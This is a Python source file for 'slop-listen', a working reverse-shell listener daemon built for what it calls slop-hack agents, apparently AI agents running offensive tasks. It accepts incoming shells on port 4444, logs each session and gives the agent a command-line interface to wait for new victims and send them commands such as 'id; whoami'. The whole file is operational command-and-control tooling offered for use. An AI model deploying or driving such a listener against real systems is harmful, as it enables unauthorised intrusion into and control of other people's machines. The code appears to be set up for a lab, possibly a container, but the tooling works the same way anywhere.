#!/usr/bin/env python3
"""slop-listen: multi-channel reverse-shell listener for slop-hack agents.

Provides a TCP-raw listener (more channels can be added). Each accepted
connection gets a session id and per-session log + command fifo. Agents
talk to it via the CLI:

    slop-listen --start [--port 4444]         # spawn listener daemon
    slop-listen --info                        # JSON: {lhost, channels...}
    slop-listen --wait [--timeout 30]         # block until next session connects
    slop-listen --send <sid> "id; whoami"     # write to shell, return stdout
    slop-listen --status                      # list sessions
    slop-listen --stop                        # kill daemon

State on disk:
    /tmp/slop-listener/
      ├── pid                                 # daemon pid
      ├── info.json                           # advertised channels
      ├── tcp/
      │   ├── <sid>.log                       # full bidirectional log
      │   ├── <sid>.out                       # response capture
      │   └── <sid>.in                        # named pipe for commands
"""
from __future__ import annotations
import argparse
import json
import os
import select
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
import uuid
from pathlib import Path

STATE = Path("/tmp/slop-listener")
TCP_DIR = STATE / "tcp"
PID = STATE / "pid"
INFO = STATE / "info.json"
LOCK = STATE / "wait.lock"
NEW_SESSIONS = STATE / "new-sessions"   # newline-delimited as they arrive


def lhost() -> str:
    """Best-guess IP the listener container reaches from the docker bridge."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return socket.gethostbyname(socket.gethostname())


def _session_id() -> str:
    return uuid.uuid4().hex[:12]


def _handle(conn: socket.socket, addr) -> None:
    sid = _session_id()
    out_path = TCP_DIR / f"{sid}.out"
    in_path = TCP_DIR / f"{sid}.in"
    log_path = TCP_DIR / f"{sid}.log"

    # FIFO for operator → shell
    try:
        os.mkfifo(in_path)
    except FileExistsError:
        pass

    out_f = open(out_path, "ab", buffering=0)
    log_f = open(log_path, "ab", buffering=0)
    log_f.write(f"--- session {sid} from {addr[0]}:{addr[1]} at {time.time()}\n".encode())

    # Announce new session
    with open(NEW_SESSIONS, "a") as f:
        f.write(json.dumps({
            "channel": "tcp_raw",
            "session_id": sid,
            "peer": f"{addr[0]}:{addr[1]}",
            "ts": time.time(),
        }) + "\n")

    # Reader: socket → out + log
    def reader():
        try:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                out_f.write(data)
                log_f.write(data)
        except Exception:
            pass

    # Writer: fifo → socket + log
    def writer():
        try:
            while True:
                # Block on open until operator writes
                fifo = open(in_path, "rb")
                while True:
                    line = fifo.readline()
                    if not line:
                        break
                    conn.sendall(line)
                    log_f.write(b"<<< " + line)
                fifo.close()
        except Exception:
            pass

    threading.Thread(target=reader, daemon=True).start()
    threading.Thread(target=writer, daemon=True).start()


def daemon_main(port: int) -> None:
    TCP_DIR.mkdir(parents=True, exist_ok=True)
    NEW_SESSIONS.touch()
    INFO.write_text(json.dumps({
        "tcp_raw": {"lhost": lhost(), "lport": port},
        "started": time.time(),
    }))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(16)
    while True:
        conn, addr = s.accept()
        threading.Thread(target=_handle, args=(conn, addr), daemon=True).start()


# ---------- CLI ----------

def cmd_start(args) -> int:
    if PID.exists():
        try:
            os.kill(int(PID.read_text()), 0)
            print(json.dumps(json.loads(INFO.read_text())))  # already running, return info
            return 0
        except Exception:
            pass

    STATE.mkdir(parents=True, exist_ok=True)
    if STATE.exists():
        # clean prior state
        for sub in ("tcp",):
            sd = STATE / sub
            if sd.exists():
                shutil.rmtree(sd)
        TCP_DIR.mkdir()
        NEW_SESSIONS.touch()
        if INFO.exists():
            INFO.unlink()

    # Fork ourselves with --daemon
    proc = subprocess.Popen(
        [sys.executable, __file__, "--daemon", "--port", str(args.port)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
    PID.write_text(str(proc.pid))

    # Wait until info.json appears
    for _ in range(50):
        if INFO.exists():
            print(INFO.read_text())
            return 0
        time.sleep(0.1)
    print(json.dumps({"error": "daemon start timed out"}))
    return 1


def cmd_info(args) -> int:
    if INFO.exists():
        print(INFO.read_text())
        return 0
    print(json.dumps({"error": "not running — slop-listen --start first"}))
    return 1


def cmd_stop(args) -> int:
    if not PID.exists():
        print(json.dumps({"ok": True, "msg": "not running"}))
        return 0
    try:
        os.kill(int(PID.read_text()), signal.SIGTERM)
    except Exception as e:
        print(json.dumps({"error": str(e)})); return 1
    PID.unlink(missing_ok=True)
    INFO.unlink(missing_ok=True)
    print(json.dumps({"ok": True}))
    return 0


def cmd_wait(args) -> int:
    """Wait for next new session, return its event line."""
    if not NEW_SESSIONS.exists():
        print(json.dumps({"error": "listener not started"})); return 1
    start_size = NEW_SESSIONS.stat().st_size
    deadline = time.time() + args.timeout
    while time.time() < deadline:
        sz = NEW_SESSIONS.stat().st_size
        if sz > start_size:
            with open(NEW_SESSIONS) as f:
                f.seek(start_size)
                for line in f:
                    print(line.strip()); return 0
        time.sleep(0.5)
    print(json.dumps({"error": "timeout"})); return 2


def cmd_status(args) -> int:
    if not NEW_SESSIONS.exists():
        print(json.dumps({"sessions": []})); return 0
    sessions = []
    with open(NEW_SESSIONS) as f:
        for line in f:
            try:
                sessions.append(json.loads(line))
            except Exception:
                continue
    print(json.dumps({"sessions": sessions, "count": len(sessions)}))
    return 0


def cmd_send(args) -> int:
    sid = args.session_id
    in_path = TCP_DIR / f"{sid}.in"
    out_path = TCP_DIR / f"{sid}.out"
    if not in_path.exists():
        print(json.dumps({"error": f"no such session {sid}"})); return 1

    pre_size = out_path.stat().st_size if out_path.exists() else 0
    # Write command + newline
    with open(in_path, "wb") as f:
        f.write((args.command + "\n").encode())

    # Wait for response — poll output growth, settle when no growth for 0.5s
    deadline = time.time() + args.timeout
    last_size = pre_size
    last_change = time.time()
    while time.time() < deadline:
        sz = out_path.stat().st_size if out_path.exists() else 0
        if sz > last_size:
            last_size = sz
            last_change = time.time()
        elif time.time() - last_change > 0.5 and sz > pre_size:
            break
        time.sleep(0.1)

    response = b""
    if out_path.exists():
        with open(out_path, "rb") as f:
            f.seek(pre_size)
            response = f.read()
    print(json.dumps({
        "session_id": sid,
        "command": args.command,
        "response": response.decode(errors="replace"),
        "bytes": len(response),
    }))
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(prog="slop-listen")
    ap.add_argument("--daemon", action="store_true", help=argparse.SUPPRESS)
    ap.add_argument("--port", type=int, default=4444)
    ap.add_argument("--start", action="store_true")
    ap.add_argument("--info", action="store_true")
    ap.add_argument("--stop", action="store_true")
    ap.add_argument("--status", action="store_true")
    ap.add_argument("--wait", action="store_true")
    ap.add_argument("--timeout", type=int, default=30)
    ap.add_argument("--send", dest="session_id")
    ap.add_argument("command", nargs="?", default="")
    args = ap.parse_args()

    if args.daemon:
        daemon_main(args.port); return 0
    if args.start:  return cmd_start(args)
    if args.info:   return cmd_info(args)
    if args.stop:   return cmd_stop(args)
    if args.status: return cmd_status(args)
    if args.wait:   return cmd_wait(args)
    if args.session_id is not None:
        if not args.command:
            print(json.dumps({"error": "usage: slop-listen --send <sid> <command>"})); return 2
        return cmd_send(args)

    ap.print_help(); return 2


if __name__ == "__main__":
    sys.exit(main())
